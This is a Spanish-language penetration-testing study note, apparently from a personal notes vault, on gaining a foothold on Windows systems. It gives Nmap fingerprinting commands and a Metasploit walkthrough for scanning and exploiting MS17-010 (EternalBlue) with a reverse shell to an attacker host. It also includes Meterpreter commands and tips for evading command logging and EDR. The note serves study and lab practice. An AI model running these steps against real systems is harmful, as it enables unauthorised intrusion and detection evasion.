---
tags:
  - metasploit
  - nmap
  - foothold
---
## Conceptos Clave (TL;DR)

* La superficie de ataque de Windows ha crecido debido a la interconectividad con servicios en la nube, características de Active Directory y el Subsistema de Windows para Linux (WSL).

* Históricamente, existen vulnerabilidades críticas recurrentes que permiten la ejecución remota de código (RCE) y escalada a SYSTEM, tales como MS08-067, EternalBlue (MS17-010), PrintNightmare, BlueKeep, y Zerologon.

* Las cargas útiles (payloads) en sistemas Windows pueden desplegarse mediante diversos formatos ejecutables según el vector, incluyendo DLLs, archivos Batch (.bat), scripts VBS, paquetes MSI y scripts de PowerShell.

* Es fundamental identificar la versión del sistema operativo para elegir el entorno de shell adecuado (CMD o PowerShell), considerando la antigüedad del host, las necesidades de ofuscación y las políticas de ejecución locales.
  

## Herramientas Clave

* **[Nmap](../../../📂%2008%20Herramientas&Cheatsheets/Nmap.md):** Utilizado para la enumeración de puertos, recolección de banners y determinación pasiva/activa del sistema operativo basándose en métricas de la pila TCP/IP.

* **[Metasploit](../../../📂%2008%20Herramientas&Cheatsheets/Metasploit.md) Framework / MSFVenom:** Framework versátil para buscar vulnerabilidades, generar payloads multiplataforma, explotar servicios y realizar post-explotación.

* **Impacket:** Colección de herramientas en Python orientadas a interactuar directamente con protocolos de red de Windows (psexec, smbclient, wmi, Kerberos) y desplegar servidores SMB.

* **Nishang / Mythic C2 / Darkarmour:** Frameworks y utilidades para generar binarios ofuscados, crear implantes de PowerShell ofensivos y gestionar Comando y Control (C2).

  
## Metodología Paso a Paso

**Fase 1: Fingerprinting y Reconocimiento Activo**

Se debe confirmar si el objetivo es un entorno Windows antes de lanzar herramientas específicas. Esto se logra analizando el comportamiento de red básico, como el valor del Time To Live (TTL) en las respuestas ICMP, donde un valor de 128 (o cercano) es el estándar de Windows. Posteriormente, se enumeran los puertos y versiones exactas.

  

**Fase 2: Enumeración de Servicios y Escaneo de Vulnerabilidades**

Al confirmar los puertos abiertos (ej. 135, 139, 445), se evalúan vulnerabilidades asociadas a la versión del sistema y el protocolo (ej. SMB para EternalBlue). Es imperativo confirmar la vulnerabilidad mediante escáneres auxiliares antes de comprometer la estabilidad del sistema con un exploit activo.

  

**Fase 3: Preparación y Transferencia del Payload**

Dependiendo del método de acceso, se debe compilar un payload en el formato correcto (DLL, MSI, EXE, etc.). La transferencia puede realizarse aprovechando los mismos protocolos expuestos, como montar recursos compartidos SMB (C$, ADMIN$) utilizando herramientas como Impacket, o mediante vectores web.

  

**Fase 4: Explotación y Obtención de Shell**

Ejecutar el ataque configurando correctamente el entorno (RHOSTS, LHOST, LPORT). Al recibir el callback, se debe identificar inmediatamente el nivel de privilegios y el tipo de shell obtenido (CMD vs. PowerShell) mediante comandos básicos de interacción y formato del prompt, para planificar la persistencia y evasión.

  

## Cheat Sheet de Comandos

```bash
# Validar rápidamente si el host es Windows a través del TTL de ICMP (Valor cercano a 128)
ping <TARGET_IP>

  
# Escaneo de Nmap con salida verbosa y detección de Sistema Operativo basado en huellas de red
sudo nmap -v -O <TARGET_IP>
  

# Escaneo agresivo de Nmap que incluye detección de OS, scripts por defecto, versiones y traceroute
sudo nmap -v -A -Pn <TARGET_IP>
  

# Ejecutar script NSE específico para capturar los banners de los servicios expuestos
sudo nmap -v <TARGET_IP> --script banner.nse
```

```bash
# Búsqueda en Metasploit de módulos relacionados con una vulnerabilidad (ej. EternalBlue)
search eternal
  

# Cargar un módulo de escáner auxiliar para validar de forma segura si el host es vulnerable a MS17-010
use auxiliary/scanner/smb/smb_ms17_010
  

# Configurar IP objetivo para el escáner auxiliar o exploit
set RHOSTS <TARGET_IP>

  
# Ejecutar el módulo seleccionado
run
```

```bash
# Cargar módulo de explotación activo para MS17-010 (ej. versión psexec)
use exploit/windows/smb/ms17_010_psexec

  
# Mostrar opciones requeridas por el módulo y payload
show options

  
# Configurar IP del atacante (Listen Host) para el callback de la shell reversa
set LHOST <ATTACKER_IP>

  
# Configurar puerto local (Listen Port) para la shell reversa
set LPORT <ATTACKER_PORT>

  
# Iniciar la explotación y levantar el handler
exploit
```

```bash
# Comando dentro de sesión Meterpreter para confirmar el usuario actual (búsqueda de NT AUTHORITY\SYSTEM)
getuid
  

# Comando dentro de sesión Meterpreter para derivar a una shell interactiva del sistema
shell
  

# Comando nativo de Windows (dentro de la shell) para identificar si el entorno actual es CMD o PowerShell
help
```

## "Gotchas" y Troubleshooting

* El escaneo de detección de sistema operativo de Nmap (`-O`) es propenso a errores si existe un firewall activo u ofuscación de red. Si los resultados son incompletos, reintentar utilizando `-A` junto con `-Pn` (sin ping).

* Las políticas de ejecución (Execution Policy) restrictivas o el User Account Control (UAC) pueden bloquear silenciosamente la ejecución de scripts en PowerShell. Si enfrentas bloqueos, retrocede a utilizar `cmd.exe`.

* El uso de `cmd.exe` no mantiene un registro histórico de los comandos utilizados durante la sesión local, lo que lo hace intrínsecamente más sigiloso que PowerShell para interacciones manuales rápidas.

* PowerShell no está presente de forma nativa en sistemas operativos previos a Windows 7 (ej. Windows XP o Server 2003); los exploits para estos sistemas antiguos deben utilizar cargas o comandos basados estrictamente en MS-DOS (archivos .bat o .vbs).

* Al evaluar defensas, considerar que actualmente el tráfico de red de WSL (Windows Subsystem for Linux) y muchas acciones de PowerShell Core evaden o no son parseadas correctamente por el Firewall nativo de Windows y las soluciones EDR/AV como Defender.